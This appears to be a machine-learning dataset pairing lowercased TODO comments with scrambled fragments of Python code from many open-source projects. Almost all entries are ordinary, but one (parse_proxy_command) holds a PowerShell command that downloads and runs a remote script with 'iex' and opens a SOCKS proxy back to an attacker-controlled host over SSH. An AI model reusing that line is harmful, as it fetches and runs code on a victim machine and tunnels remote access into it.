# todo: look this up in one query </s> for user_id in p.collaborator_ids:	get_playlists_for_user p.collaborator_ids = playlist_collaborator_ids.get(p.id, []) collaborators = [] user = db_user.get(user_id) if user:
# todo: figure out how to do this for multiple inputs </s> batch, out_channels, out_x, out_y = module.output_shape	weight_diag_ggn def weight_diag_ggn(module, grad_output, sqrt_ggn_out): in_features = module.input0.numel() / batch out_features = out_channels * out_x * out_y
# todo: fix appveyor - error comes up with bollu/vispy:cassowary-constaints </s> if os.getenv('appveyor', '') == 'true':	test_arrow_transform_draw @requires_application() def test_arrow_transform_draw(): raise SkipTest('AppVeyor has unknown failure') old_numpy = LooseVersion(np.__version__) < '1.8'
# todo confirm we want floor division here </s> utilities.reshape(numalts, utilities.size() // numalts)	mnl_probs if numalts == 0: raise Exception("Number of alternatives is zero") exponentiated_utility = utilities.exp(inplace=True) if clamp:
# todo(hirofumi0810): remove this after supporting trasformer for the st task </s> return self.recognize_batch(x, trans_args, char_list, rnnlm)	translate_batch def translate_batch(self, x, trans_args, char_list=None, rnnlm=None):
# todo: expand to full set of info </s> def create_workflows_table(meta):	create_workflows_table return Table( 'workflows', meta,
#todo - is there a nice way to return an iterator and </s> try:	emboss_piped_AlignIO_convert child.stdin.close() child.stderr.close() aligns = list(AlignIO.parse(child.stdout, new_format)) except Exception, err:
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_comparison def test_comparison(self):
# todo 2.8 i want to change the way we handle unit scaling, see </s> return matrix.copy()  # someone might rely on this being a copy	get_scaled_to_world def get_scaled_to_world(matrix, scene):
# todo: refactor common tests for all models, e.g. shape checking </s> scores = model.forward_owa(triples)	test_simple batch_size = 16 triples = torch.zeros(batch_size, 3, dtype=torch.long) assert scores.shape == (batch_size, 1) scores = model.forward_cwa(triples[:, :2])
#todo same issue with batch_size </s> if len(self.inputs) == 0:	channels def channels(self): raise ValidationException("gan.channels() requested but no inputs provided") return self.ops.shape(self.inputs[0])[-1]
#todo: check sequence id </s> self.__packet_number = byte2int(packet_header[3])	_recv_packet if DEBUG: dump_packet(packet_header) packet_length_bin = packet_header[:3] bin_length = packet_length_bin + b'\0'  # pad little-endian number bytes_to_read = struct.unpack('<I', bin_length)[0]
# todo: add a .parse() method that includes boths steps? </s> vi_cmd_data = self.parse_motion()	VintageState def run(self): if self.cancel_action: vi_cmd_data = self.parse_action(vi_cmd_data) if vi_cmd_data['must_blink_on_error']:
# todo(rakhmerov): actionspec should be used instead of dict. </s> transformer = self.action_spec.get('output')	_convert_result def _convert_result(self, result): if not transformer: return result
# todo if standby ready, just swap and continue. </s> await self._recover_from_changelog(table, assigned)	TableManager await self.app.consumer.pause_partitions(assigned) for table in self.values(): await self.app.consumer.resume_partitions({ tp for tp in assigned
# @todo: split into smaller routines </s> repo_path = self.repo_path	build def build(self, args, all_package_builds): build_dir = os.path.join(BUILD_CACHE, self.package_name) if os.path.exists(build_dir):
#todo: we may want to deal with error nicely </s> logging.debug('api timeout error : ' + api_url)	voip_rates response = requests.get(api_url, auth=(request.user, request.user), timeout=1.0) except requests.exceptions.Timeout: else: api_url = full_url + 'rest-api/voip-rate/?sort_field=%s&sort_order=%s' % (sort_order, order)
# todo: optimization </s> if block in recent_blocks:	_check_chain_head new_blocks = [] for _ in range(history_size): break new_blocks.append(block)
# time.sleep(20)  # todo: should remove after polling get. </s> res = res.reconstruct()	test_mpc_forward_methods res = op_mpc(**kwargs) res.block_with_timeout(secs=20) expected = op(**kwargs) assert (res == expected).all()
1/0  # conflict resolution todo </s> elif list_a[uid] != status[uid][0]:  # item was updated in a	get_actions if uid in list_a and uid in list_b: if list_a[uid] != status[uid][0] and list_b[uid] != status[uid][1]: prefetch_from_a.append(uid) actions.append(('update', uid, 'a', 'b'))
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_comparison def test_comparison(self):
# todo: dry things, should be one function for sa and mongo </s> for i in range(rows):	create_table await conn.execute(create_expr) values = [] values.append({ 'title': 'title {}'.format(i),
# todo security </s> def query_suggest(request, core, query=""):	query_suggest hue_core = Core.objects.get(name=core) result = {'status': -1, 'message': 'Error'}
pass # todo(denero) re-enable when self.inst is actually valid. </s> def test_entity_create_basic(self):	test_entity_create_basic
# todo assert cls.__tablename__ == '' </s> with dbcleanup(session, cls):	test_HistoryDatasetAssociationTagAssociation model, session, history_dataset_association, tag, user): cls = model.HistoryDatasetAssociationTagAssociation user_tname, value, user_value = 'a', 'b', 'c' obj = cls(user=user, tag_id=tag.id, user_tname=user_tname, value=value)
# todo: temporarily use paddle.nonzero instead of paddle.max </s> if len(paddle.nonzero(valid_label < 0)) > 0:	cross_entropy valid_label = paddle.where(label == ignore_index, paddle.zeros_like(label), label) invalid_label = paddle.gather_nd( valid_label, paddle.nonzero(valid_label < 0))
# todo: for backward compatibility only, remove if not used anymore </s> def get_project_id(self):	get_project_id return get_project(key='id')
# todo: smarter behavior </s> obj.setselection(-1,-1)	OnSubscribeMouseAction def OnSubscribeMouseAction(self,event): obj = event.GetEventObject() event.Skip()
# todo(vek): need to pass context in for access to auth_token </s> raise notimplementederror()	live_migration recovery method when any exception occurs. expected nova.compute.manager.recover_live_migration.
from _devbuild.gen.id_kind_asdl import id  # todo: fix circular dep </s> return self.token.id == id.controlflow_break	IsBreak def IsBreak(self):
# todo(sahid): direct call from domain should </s> new_dom = guest._domain	snapshot guest = self._create_domain( domain=virt_dom, pause=True) if new_dom is not None: self._attach_pci_devices(new_dom,
# todo: calculate mu-sigma for f1, accuracy, and roc_auc and make it selectable </s> self.test_scores['judgment_metric'] = self.test_scores['mu_sigmas']	train_final_model rank_accuracies=results['rank_accuracy'], mu_sigmas=results['mu_sigma'])
# todo: check u + v cubes for compatibility. </s> kwargs['_v_data'] = v_cube.data	streamplot See :func:`matplotlib.pyplot.quiver` for details of other valid keyword arguments. return _draw_2d_from_points('streamplot', _vector_component_args, u_cube, *args, **kwargs)
raise exception('lol') #todo fixme </s> return excludes	get_excludes excludes = open(exclude_file_path, 'w').read().split() except IOError:
# todo: actual implementation </s> return	log_message @expose("log-message") def log_message(args):
# todo: we may want to log this as soon as mobile ucr stops hitting this </s> if not isinstance(query_context.report_filter, dynamicchoicelistfilter):	get_choices_from_data_source_column def get_choices_from_data_source_column(query_context): return [] adapter = IndicatorSqlAdapter(query_context.report.config)
# todo: amortized flow parameters </s> if args.cuda:	__init__ self.log_det_j = 0. self.cnf = build_model_tabular(args, args.z_size) self.cuda()
# todo(ihrachys): replace with network.create() once we get an object </s> self._network = db_api.create_object(self.context, models_v2.network,	_create_test_network def _create_test_network(self): {'name': 'test-network1'})
# todo: set fileinfo to a valid object. </s> _update_metadata('targets', none, compression='gzip')	test_3__update_metadata targets_filepath_compressed = self._compress_file(self.targets_filepath) self._mock_download_url_to_tempfileobj(targets_filepath_compressed) list_of_targets = self.Repository.metadata['current']['targets']['targets'] if added_target_2 not in list_of_targets.keys():
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_empty def test_fail_empty(self): Request is empty.
# todo: this needs test coverage. </s> return self.dates[self._country_group[lifetimes][start_date][:]]	asset_start_dates @lazyval def asset_start_dates(self):
# todo: assert len(args) == len(node.defn.type_vars) </s> return instance(node, args)	builtin_type assert isinstance(node, TypeInfo) if args: return Instance(node, [AnyType()] * len(node.defn.type_vars))
# todo: check arp reply is valid </s> self.asserttrue(self.packet_outs_from_flows(arp_replies))	arp_for_controller 'arp_source_ip': '10.0.0.1', 'arp_target_ip': '10.0.0.254'})
# todo check axises </s> in_conn = (a.sum(axis=1)>0).nonzeros()	_check_connectivity_undirected if c_is_connected: break out_conn = in_conn if c_is_connected and r_is_connected:
# todo: try to find a better way to deal with local execution </s> if self.is_method and not self.locations and self.owner == sy.hook.local_worker:	_prepare_for_running_local_method def _prepare_for_running_local_method(self): self._self.send(sy.hook.local_worker, force_send=True)
# todo add tests when funcs are not set in lambda </s> def func_images(images, random_state, parents, hooks):	test_Lambda assert len(observed.polygons) == 0 assert observed.shape == (1, 2, 3) aug = iaa.Fliplr(1.0)  # fliplr is know to work with all dtypes return aug.augment_images(images)
# todo: get_style and word_to_glyphs may need proper implementations </s> pass	before_placing def before_placing(self, container):
# todo: probably replace class_labels list with some custom object </s> mask_out_class_label = class_labels[-1]	get_valid_entries_indices_from_annotation valid_labels_indices : Tensor of size (num_valid_eintries, 2). Tensor with indices of valid entries valid_labels_mask_2d = tf.not_equal(annotation_tensor, mask_out_class_label)
# todo applicative log, database tracking of queue </s> continue	operation print "Receiver", receiver_info['receiver_gus'], \ "has not an active notification settings in context", single_tip['context_gus'], "for", plugin_type related_profile = yield profile_iface.get_single(receiver_conf['profile_gus']) settings_dict = { 'admin_settings' : related_profile['admin_settings'],
# todo: may test file contents </s> temp = tempfile.namedtemporaryfile(delete=false)	test_export_to_csv_filename def test_export_to_csv_filename(self): self.files_to_delete.append(temp.name) rows.export_to_csv(utils.table, temp.name)
# todo: we can't disable this for normal, because folders don't </s> actions["vccommit"] = all(s not in (	update_actions_for_paths states = path_states.values() actions["VcCompare"] = bool(path_states) _vc.STATE_NONE, _vc.STATE_IGNORED) for s in states) actions["VcUpdate"] = True
# todo: when this is changed to be a view, use loadselect2mixin instead of this </s> select2_css = getattr(settings, 'select2_css_url', none)	contest_ranking_view contest_access_check(request, contest) users, problems = get_contest_ranking_list(request, contest, participation) select2_js = getattr(settings, 'SELECT2_JS_URL', None) has_select2 = select2_css is not None and select2_js is not None
#todo : include with the service cache. </s> self.mapping_service_id[data['id']] = service_id	manage_initial_service_status_brok host_id = self.get_host_object_id_by_name_sync(data['host_name'],data['instance_id']) service_id = self.get_service_object_id_by_name_sync(data['host_name'], data['service_description'],data['instance_id']) services_data = { 'instance_id' : data['instance_id'], 'service_object_id' : service_id, 'host_object_id' : host_id,
# todo: get indexed value before transferring the variable (might be much smaller) </s> if indices is not none:	_get_val else: val = self._abs_get_val(abs_name, get_remote, rank, vec_name, kind, flat) val = val[indices] if units is not None:
# todo: campid 939921818394902983238 </s> if frame is not none:	importSym if frameName != line.replace('[','').replace(']','').strip(): frameName = line.replace('[','').replace(']','').strip() if len(multiplexValTable) > 0: frame.signalByName(frame._name + "_MUX")._values = multiplexValTable
# todo(ja): reclaiming space should be done lazy and low priority </s> self._copy_volume('/dev/zero', self.local_path(volume), size_in_g)	_delete_volume def _delete_volume(self, volume, size_in_g): self._try_execute('sudo', 'lvremove', '-f', "%s/%s" % (FLAGS.volume_group, volume['name']))
# todo: remove in 1.3 </s> def test_kbinsdiscretizer_subsample_warn():	test_kbinsdiscretizer_subsample_warn X = np.random.rand(200001, 1).reshape(-1, 1) kbd = KBinsDiscretizer(n_bins=100, encode="ordinal", strategy="quantile")
# todo: refactor: this list of geotags is only used to determine if we need to show the geotag map or not </s> latest_geotags = sound.public.filter(user=user).exclude(geotag=none)[0:10]	home unmoderated_packs = Pack.objects.select_related().filter(user=user).exclude(sound__moderation_state="OK", sound__processing_state="OK").annotate(num_sounds=Count('sound'), last_update=Max('sound__created')).filter(num_sounds__gt=0).order_by("-last_update")[0:5] packs_without_sounds = Pack.objects.select_related().filter(user=user).annotate(num_sounds=Count('sound')).filter(num_sounds=0) google_api_key = settings.GOOGLE_API_KEY home = True
"""todo doc me""" </s> def count(table):	count
# todo(leofang): test newer rocm versions </s> if (self.axes == (0, 1) and self.shape == (2, 3, 4)):	setUp def setUp(self): if cupy.cuda.runtime.is_hip: raise unittest.SkipTest("hipFFT's PlanNd for this case "
# todo maybe add the ability to disable this in settings ("identification" option, "basic" or "accurate") </s> extended = cls.get_parser().parse(file_name)	get_episode_identifier return None, [] file_name = os.path.splitext(os.path.basename(parts[0].get('file')))[0] identifier = cls.get_chain_identifier(extended.chains[0].info) if extended.chains else None season = try_convert(video.get('parentIndex'), int)
# todo: return errors in a universal way </s> print("shivyc: error: no such file or directory: '{}'"	main c_file = open(arguments.file_name) except IOError: .format(arguments.file_name)) return
# todo: more error checking on the kernel to make sure it doesn't </s> f_ir = numba.ir_utils.get_ir_of_code({}, func_node.code)	_run_call_rolling raise ValueError( "cannot find kernel function for rolling.apply() call") kernel_func = numba.compiler.compile_ir( self.typingctx,
# todo: move it via south </s> db.execute('''	forwards ) db.alter_column('core_placement', 'publishable_id', models.ForeignKey(Publishable)) ALTER TABLE `core_placement` DROP FOREIGN KEY `core_placement_ibfk_2`; db.create_index('core_placement', ['publishable_id'])
# todo results from ml </s> return str(endpoint.metadata)	_get_prev_device_types @staticmethod def _get_prev_device_types(endpoint):
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_comparison def test_comparison(self):
# todo: does this make sense? </s> messager.warning("project configuration: term %s matches multiple types (incl. '%s' and '%s'). configuration may be wrong." % (t, d[t].storage_form(), e.storage_form()), 5)	get_node_by_storage_form t = e.storage_form() if t in d: d[t] = e cache[directory] = d
# todo: issue #503 make pipx commands have proper exit codes </s> return 0	run_pipx_command elif args.command == "list": commands.list_packages(venv_container, args.include_injected) elif args.command == "uninstall": return commands.uninstall(venv_dir, constants.LOCAL_BIN_DIR, verbose)
# todo: there must be a better way to do this. otherwise sometimes a file </s> files = tf.gfile.glob('{}/events.out.tfevents*'.format(self.plugin_logdir))	write_summary a = time.time() summary = self.SESSION.run(self.summary_op) for file in files: tf.gfile.Remove(file)
# todo also check for motion codec parameter support </s> return 'hevc_qsv' in codecs.get('hevc', {}).get('encoders', set())	has_hevc_qsv_support if not binary: return False
# todo add tests </s> coords=np.concatenate([self.coords, other.coords], axis=0))	concatenate return self.deepcopy(
# todo: remove this method in v2.5 </s> elif self._values['disabled'] in booleans_true:	disabled if self._values['state'] == 'disabled': return True return True elif self._values['disabled'] in BOOLEANS_FALSE:
# todo: mock these so no network access is required </s> p_ret = launchpad_handler.fetch_metadata(self.package)	test_fetch_metadata def test_fetch_metadata(self): self.assertTrue(p_ret.repo_watchers > 0) self.assertTrue(p_ret.repo_forks > 0)
# todo: add batch args </s> logger.info("-----  pos        ----------")	run_ete logger.info("No MWT in training data.  Skipping") mwt_output = tokenizer_output pos_output = f"{ete_dir}/{short_name}.{dataset}.pos.conllu" pos_args = ['--wordvec_dir', wordvec_dir,
# todo: implement me </s> self.logmessage("%s %s" % (msg.__class__, vars(msg)), 4)	DistribBranchRoot def DistribBranchRoot(self, msg):
# todo(#28) throw a configerror once it will be caught... </s> log_file("configuration missing key for %s on %s" % (console.shortname, platform))	lookup_emulator return emulator_from_name(name)(console.shortname) except KeyError as e: return None except AttributeError as e:
# todo: remove original subject and object from entity set </s> pos_batch = pos_batches[i]	_train_conv_e_model current_epoch_loss = 0. for i in range(len(pos_batches)): current_batch_size = len(pos_batch) batch_subjs = pos_batch[:, 0:1]
# todo vary by supply point type? </s> return {	get_threshold def get_threshold(type): 'low': UNDERSTOCK_THRESHOLD, 'high': OVERSTOCK_THRESHOLD,
# todo - unittest this </s> for i, arg in enumerate(cmdline):	get_runsvdir_dir_from_cmdline def get_runsvdir_dir_from_cmdline(cmdline): if arg == '-P' and len(cmdline) > i + 1: return cmdline[i + 1]
# todo: we can't disable this for normal, because folders don't </s> actions["vccommit"] = all(s not in (	update_actions_for_paths states = path_states.values() actions["VcCompare"] = bool(path_states) _vc.STATE_NONE, _vc.STATE_IGNORED) for s in states) actions["VcUpdate"] = True
# todo: figure out the right thing to do here </s> return mu_1**2 + mu_2**2, np.array([0.0, 0.0, 1.0, 0.0, 0.0, 1.0], dtype=np.float32)	gaussian_energy_grad det = sigma_11 * sigma_22 - sigma_12 ** 2 if det == 0.0: cross_term = 2 * sigma_12 m_dist = np.abs(sigma_22) * (mu_1 ** 2) - \
# todo: preallocate! </s> i, j, v = np.empty(0), np.empty(0), np.empty(0)	faceDiv if getattr(self, '_faceDiv', None) is None: self.number() for cell in self.sortedCells: i, j, v = cell.faceIndex
# todo(haoyuzhang): set config properly in tf2.0 when the config api is ready. </s> dtype = flags_core.get_tf_dtype(flags_obj)	run sess = tf.Session(config=config) tf.keras.backend.set_session(sess) if dtype == 'fp16': raise ValueError('dtype fp16 is not supported in Keras. Use the default '
# todo implement w regex </s> words = []	words_from_text def words_from_text(s, words_to_ignore=[]): and splits into words. """ word = "" for c in " ".join(s.split()):
while 1:  # todo: speed this up </s> if icase == -1:	on_rcycle_results return icase = self.icase - 1 icase = self.ncases - 1 try:
# todo, pass complete checkpoint as state dictionary </s> mp_queue.put(best_model_path)	transfer_distrib_spawn_state_on_fit_end if self.trainer.global_rank == 0 and mp_queue is not None: rank_zero_warn('cleaning up ddp environment...') mp_queue.put(results) last_path = None
# todo  the model predictions changed after update to posthoc sparsity. need to investigate. </s> test_cfs = [[70.0, 'private', 'masters', 'single', 'white-collar', 'white', 'female', 51.0, 0.534], [22.0, 'self-employed', 'doctorate', 'married', 'service', 'white', 'female', 45.0, 0.861], [47.0, 'private', 'hs-grad', 'married', 'service', 'white', 'female', 45.0, 0.589], [36.0, 'private', 'prof-school', 'married', 'service', 'white', 'female', 62.0, 0.937]]	test_final_cfs_and_preds dice_exp = self.exp.generate_counterfactuals(sample_adultincome_query, total_CFs=4, desired_class="opposite")
return none  # todo: mypy shouldn't require this </s> return none  # any more than it should require this	get_password_from_keyring except Exception as exc: warnings.warn(str(exc))
# todo: log discarded bytes? </s> return 'response discarded due to invalid crc.'	decode_out if not self.valid_crc(self.out_data[1:]): self.out_parsing = False return self._decode_req() else:
raise notimplementederror  # todo </s> return dataset	map_producer_to_consumer raise NotImplementedError  # TODO if self.distributed_tf_enabled:
# todo don't use intermediate schematic... </s> export = self.currentimport.sourcedim.exportschematiciter(self.currentimport.selection)	confirmImport command = MoveFinishCommand(self, self.currentImport) with command.begin(): schematic = showProgress("Copying...", export) fill = self.editorSession.currentDimension.fillBlocksIter(self.editorSession.currentSelection, "air")
# todo: remove cache clearing once upstream issues regarding non-batch </s> acq_function.model.train()	q_batch_initialization ) _, best_indices = torch.topk(val_X, k=torch_batches) acq_function.model.eval() return bulk_X[best_indices]
# todo, complete when the method becomes available, create proper response code </s> pass	move_playlist_item validate_move_data(data) try: except Exception as e: current_app.logger.error("Error while adding recordings to playlist: {}".format(e))
# todo: add this to help output. </s> merge_edit_command_parser.add_argument(	Main help=u'the github origin to merged e.g. username:feature.') merge_edit_command_parser = commands_parser.add_parser(u'merge_edit') u'github_origin', action=u'store', metavar=u'GITHUB_ORIGIN', default=None,
# todo: non-int dict </s> func_text += "    key_write_map = hpat.dictintint()\n"	agg_distributed_run func_text += "    output_{} = np.empty(n_uniq_keys, np.{})\n".format( i, agg_node.out_typs[col]) func_text += "    curr_write_ind = 0\n" func_text += "    for i in range(len(key_arr)):\n"
# todo: skips header parsing </s> iline += 1	read_abaqus_inp pass elif word.startswith('material'): line0 = lines[iline].strip().lower() word = line0.strip('*').lower()
# todo(jfs): detect the case of a connection timeout </s> if i >= self.__class__._attempts_delete - 1:	_chunk_delete volume_id, container_id, content_id, chunk_id) except ConnectionError: raise
# todo fixme </s> if util.date_passed(deadline):	compose problems, leverage = validate(db, source, feed_address, bet_type, deadline, wager_quantity, counterwager_quantity, target_value, leverage, expiration, util.CURRENT_BLOCK_INDEX) problems.append('deadline passed') if problems: raise exceptions.ComposeError(problems)
uri=none,  # todo: </s> app_info=none,	do_stats extent=task['data']['geobox'].extent, center_time=task['start_time'], valid_data=None) nco.close()
# todo: implement </s> if not completions:	on_query_completions if export_module: module_word, module_as, ident, _, _ = get_qualified_symbol_at_region(view, view.sel()[0]) completions = autocompletion.get_completions(view, prefix, locations) end_time = time.clock()
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_comparison def test_comparison(self):
# todo: uncomment to enable claiming </s> ])	make_url_map Rule(["/user/merge/"], 'get', auth_views.merge_user_get, OsfWebRenderer("merge_accounts.mako")), Rule(["/user/merge/"], 'post', auth_views.merge_user_post, OsfWebRenderer("merge_accounts.mako")), process_rules(app, [ Rule('/profile/', 'get', profile_views.profile_view, json_renderer),
#todo: do something like </s> player_id = 4 #yellow	save_pngs destination_path = os.path.join(destination_path, "%06d.slp" % self.file_id) os.makedirs(destination_path, exist_ok=True)
# todo: support all tzinfo subclasses by calling utcoffset() </s> if date_time.tzinfo is not none and\	to_rfc3339_string raise ValueError("Expected a datetime object.") rfc3339 = date_time.strftime(DATE_TIME_FORMAT) date_time.tzinfo.__class__ is TZFixedOffset: offset = date_time.tzinfo.offset
except exception as exc:  # todo </s> if exc.status == 404:	reset_rabbit_vhost try: rabbit_manager.delete_vhost(vhost) pass  # vhost does not exist else:
# todo - verify contents </s> self.client.logout()	testReviewList response = self.client.get('/r/') self.assertEqual(response.status_code, 200)
# todo replace w/ something smart (sun/earth special cased) </s> r = fixed_coo.cartesian.xyz	to_equatorial @staticmethod def to_equatorial(fixed_coo, equatorial_frame): ra, dec, W = fixed_coo.rot_elements_at_epoch(fixed_coo.obstime) equatorial_frame._obstime = fixed_coo.obstime
# todo: log exception </s> return none	scan output = sshexec(host, list2cmdline(cmdline), port=port, username=user, key_filename=conf["key"]) except Exception as e: output = output.decode("utf-8", errors='replace') virusresults = re.findall("(?:\([^\)]*\) )?([^\s]+) (.+)\s+$", output, re.MULTILINE)
# todo: async </s> super(tornadiojsonpsockethandler, self).post(*args, **kwargs)	post self._index = kwargs.get('jsonp_index', None)
# todo (pp): notifications don't have id; process all </s> if not self.compare_paths(errors.file, v.file_name()):	__call__ An instance of `ErrorInfoCollection`. v = get_active_view() _logger.debug('different view active - aborting') return
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_pass_inputs_explicit def test_pass_inputs_explicit(self): Preparing a bundle with specified inputs.
pass # todo </s> def handle_request(self, input):	handle_request
# todo(mattjj, dougalm): make this work if we can, and delete subsequent test </s> self.assertraises(typeerror, lambda: jacfwd(f)(zs))	test_complex_jacfwd_raises_error return np.cos(np.linalg.norm(2 * z))
# todo: test more stuff! </s> assert self.classifier_group['pytorch_network_path'].value == ""	test_classifier_serialization classifier.serialize_hdf5(self.classifier_group)
# todo: factor this out, particularly if there are other places using </s> def ellipse(semimajor=2, semiminor=1, easting=0, northing=0, n=200):	Geostationary ('units', 'm')] super(Geostationary, self).__init__(proj4_params, globe=globe) t = np.linspace(0, 2 * np.pi, n) coords = np.vstack([semimajor * np.cos(t), semiminor * np.sin(t)])
pass # todo </s> def handle_request(self, input):	handle_request
if branch.commit == upstream.commit:  ### todo: a better check is possible </s> print(" up to date.")	_update_branch print(" skipped: no upstream is tracked.") return return if stasher:
# todo(nnorwitz): store kind of inheritance...maybe. </s> if token.name not in ('public', 'protected', 'private'):	_GetClass token = self._GetNextToken() assert token.token_type == tokenize.NAME, token self._AddBackToken(token) base, next_token = self.GetName()
# todo: dns server is just a listener. we should allow the option of backwards communication. </s> d = s.recvfrom(1024)	dns_server raise while 1: data = d[0] addr = d[1]
'''todo: add docs''' </s> def __init__(self, df):	AppModel class AppModel(object): self.df = df self.data = ColumnDataSource(df)
# todo(vek): need to pass context in for access to auth_token </s> raise notimplementederror()	poll_rescued_instances def poll_rescued_instances(self, timeout):
# todo: config option? </s> [sub_orig_hexsha, target_commit]) == target_commit:	_install_subds_from_flexible_source if sub.get_merge_base(
# todo: what about alpha (rgba)? </s> output_name = "denoised"	draw refresh_denoised = (time() - self.last_denoiser_refresh) > scene.luxcore.denoiser.refresh_interval if "DENOISED" in engine.aov_imagepipelines and refresh_denoised: output_type = pyluxcore.FilmOutputType.RGB_IMAGEPIPELINE was_paused = session.IsInPause()
# todo: deprecate </s> self.evaluation_loop.on_evaluation_end()	run_evaluation if self.reload_dataloaders_every_epoch: self.evaluation_loop.reload_evaluation_dataloaders() return eval_loop_results, eval_results
# todo: separate this string to describe what each step is doing, then build it for the final command </s> connect_back_cmd = 'iex ((new-object system.net.webclient).downloadstring("http://{}:{}/{}")); start-socksproxy -sshhost {} -username {} -password {} -remoteport 8001 -localport 5050'.format(proxy_ip, proxy_port, secret_string, proxy_ip, proxy_ssh_username, proxy_ssh_password)	parse_proxy_command t.start() time.sleep(2) else: shm_name = ''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=5))
# todo (#2743, see also #2556): make a portable constant or remove completely </s> sig_header = signature_to_follow	author if signer is not DO_NOT_SIGN: if sign_plaintext: signature = signer(plaintext) capsule, ciphertext = umbral.encrypt(recipient_key, sig_header + bytes(signature) + plaintext)
# todo: add js compress </s> js = u'<script type="text/javascript">{}</script>'.format(js)	__init__ logger.info("Load {}".format(os.path.basename(js))) js = ensure_unicode(open(js).read()) js_string.append(js) self.js_string = u"\n".join(js_string)
# todo(dcramer): when we hit a notfound in the queue, maybe we should </s> try:	_sync_step_from_queue def _sync_step_from_queue(self, step): item = self._get_response('/queue/item/{}'.format( step.data['item_id']))
raise mpdnotimplemented # todo </s> def _disableoutput(self, outputid):	_disableoutput @register(r'^disableoutput "(?P<outputid>\d+)"$')
# todo: use pybossa uploader! only for debugging: </s> open('/tmp/%d_%s_task_run_json.zip' % (app.id, name), 'wb').write(memzip.getvalue())	export_json memfile.write(str(line)) memzip = make_onefile_memzip(memfile, '%s_task_run.json' % name)
# todo -- can we do this without a subscription? </s> if not api.use_store:	list_latest_album_by_artist @ask.intent("GeeMusicListLatestAlbumIntent") def list_latest_album_by_artist(artist_name): return statement(render_template("not_supported_without_store")) api = GMusicWrapper.generate_api()
# todo: support multiple. </s> device_id=device_id)	get_all_podcast_episodes include_deleted=include_deleted, updated_after=updated_after,
# todo: handle large files </s> target.hdfs.append_file(target.path.lstrip('/'), f.read())	append_local_file_to_hdfs target.hdfs.list_dir(target.path.lstrip('/')) with open(source.path) as f: except FileNotFound: with open(source.path) as f:
# todo pv 类型判断 </s> if not (absisinstance(pv, float) and sv == pv):	in_json code = 1  # 键值不等 elif isinstance(sv, float): code = 1  # 键值不等 elif isinstance(sv, list):
# todo resume admin log? </s> if isinstance(target_in, types.inputpeerchannel):	start __log__.info('Resuming at %s (%s)', req.offset_date, req.offset_id) log_req = functions.channels.GetAdminLogRequest( target_in, q='', min_id=0, max_id=0, limit=1
llen = len(' '.join(wordsplit[-2:])) #todo: what if 2 spaces between these words? </s> return '%s%s' % (word[:-llen],	_sinoun si_sb_irregular[lowerwordlast]) if (' '.join(wordsplit[-2:])).lower() in si_sb_irregular_compound.keys(): si_sb_irregular_compound[(' '.join(wordsplit[-2:])).lower()])
# todo: don't write them? is *much* slower on re-load (~3x) </s> try:	update_module fh.flush() os.fsync(fh.fileno())  # flush to disk os.unlink(self.module_path + 'c') except OSError:
# todo: no testpath exercises this code... </s> log.debug('starting thread...')	target def target(): run() log.debug('Thread Complete')
annot.annotation_metadata.annotation_rules = "todo"  # todo </s> annot.annotation_metadata.validation_and_reliability = "todo"  # todo	fill_annotation_metadata annot.annotation_metadata.version = "1.0" annot.annotation_metadata.annotation_tools = "Sonic Visualizer" annot.annotation_metadata.origin = "Centre for Digital Music" annot.annotation_metadata.annotator.name = "TODO"
# xxx todo </s> if args.has_key('done') and args['done']:	__init__ DnsRequest.__init__(self, *name, **args) asyncore.dispatcher_with_send.__init__(self, *name, **args) self.donefunc = args['done'] else:
#todo - find a better way to handle this </s> right = ast.dummyliteral(var.dtype)	mdVisitVarUse def mdVisitVarUse(var): decl = ast.VariableDeclarator(ast.TypeName(var.dtype), var) localdefs[info[var].scope].append(ast.LocalDeclarationStatement(decl, right)) remaining.remove(var)
# todo: test me. </s> @motion.setter	motion def motion(self, name): self.settings.vi['motion'] = MOTION_TRANSLATION_TABLE.get((self.action, name), name)
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_hashes_wrong_type def test_fail_hashes_wrong_type(self):
# todo: need to close computations on this node? </s> node.clusters.clear()	run_job (DispyJob.Cancelled, dispy_node, njob.job))) node.pending_jobs = [] self._nodes.pop(node.ip_addr, None) if self._sched_jobs.pop(_job.uid, None) == _job:
# todo: fails because of missing svg support </s> page, = parse('''	test_images_18 @assert_no_logs def test_images_18(): <img style="position: absolute" src=" data:image/svg+xml,
# todo: resolve possible conflicts with sysctl settings from other plugins </s> def _post_init(self):	_post_init self._dynamic_tuning = False self._sysfs_original = {}
# todo unify </s> if num_components == 1:	_write_data else: fmt = " ".join(["{}"] + ["{!r}"] * num_components) + "\n" for k, x in enumerate(data): fh.write(fmt.format(k + 1, x).encode("utf-8"))
# todo: log exception </s> return none	scan output = sshexec(host, list2cmdline(cmdline), port=port, username=user, key_filename=conf["key"]) except Exception as e: output = output.decode("utf-8", errors='replace') virusresults = re.findall("(?:\([^\)]*\) )?([^\s]+) (.+)\s+$", output, re.MULTILINE)
# todo: remove: legacy function </s> return product.objects.filter(product_category=self, draft=false).count()	published_product_count @property def published_product_count(self):
# todo: require tests </s> return true	hessian_is_zero def hessian_is_zero(self):
# todo: this is untested. </s> raise wantx509lookuperror()	_raise_ssl_error raise ZeroReturnError() elif error == _lib.SSL_ERROR_WANT_X509_LOOKUP: elif error == _lib.SSL_ERROR_SYSCALL: if _lib.ERR_peek_error() == 0:
# todo :: move arbitrary path construction to storagelayout object </s> url = '{0}/wal_{1}/{2}.lzo'.format(self.layout.prefix.rstrip('/'),	WalUploader self.blobstore = get_blobstore(layout) def __call__(self, segment): storage.CURRENT_VERSION, segment.name)
# todo: add support for more colors </s> mapping['cmap'] = gradients.blues	_get_layers if set(possible_colors).issubset(set(colors.COLORS))==False: if "color" in mapping._get_numeric_data().columns: else: color = colors.color_gen()
# todo: test for the _correct_ revision_id value. </s> if not activity.has_key('revision_id'):	test_create_group if not activity.has_key('id'): assert False, "activity object should have an id value" assert False, "activity object should have a revision_id value" timestamp = datetime_from_string(activity['timestamp'])
# todo: only handle it if the trigger refers to the current sensor </s> trigger = self._sanitize_trigger(trigger=trigger)	_handle_create_trigger def _handle_create_trigger(self, trigger): self._sensor_instance.add_trigger(trigger=trigger) pass
